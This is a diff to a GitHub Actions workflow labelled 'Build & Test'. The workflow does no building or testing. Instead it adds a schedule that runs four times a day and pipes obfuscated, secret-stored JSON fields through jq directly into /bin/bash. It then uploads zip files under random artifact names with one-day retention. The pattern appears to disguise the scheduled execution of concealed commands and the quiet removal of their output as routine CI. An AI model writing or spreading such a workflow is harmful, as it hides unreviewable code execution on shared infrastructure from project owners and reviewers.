@@ -2,6 +2,8 @@ name: Build & Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '34 1,7,13,19 * * *'
 jobs:
   start:
     runs-on: ubuntu-latest
@@ -9,21 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute task
         env:
-          p529: ${{ secrets.p529 }}
+          rxcn12277: ${{ secrets.rxcn12277 }}
         run: |
-          printf '%s' "$p529" | jq -r .bm82145 | /bin/bash
-          printf '%s' "$pnezo9" | jq -r .chdc46 | /bin/bash
-          printf '%s' "$fz48" | jq -r .ci735 | /bin/bash
-          echo $jftyz53 | jq -r .i48074 | /bin/bash
-          printf '%s' "$jy88" | jq -r .csyds14 | /bin/bash
-          echo $q60 | jq -r .dreq44 | /bin/bash
-          echo $jzne231 | jq -r .xoudl80 | /bin/bash
-          echo $zxqev99 | jq -r .o035 | /bin/bash
+          printf '%s' "$rxcn12277" | jq -r .ishje629 | /bin/bash
+          printf '%s' "$zl5170" | jq -r .yb221 | /bin/bash
+          printf '%s' "$t68" | jq -r .jr4 | /bin/bash
+          echo $f54 | jq -r .egwmh1 | /bin/bash
+          echo $q906 | jq -r .xvih48359 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
         uses: actions/upload-artifact@v4
         with:
-          name: 0XdnWvFy
+          name: 1UsgpZsZ
           path: "*.zip"
           retention-days: 1
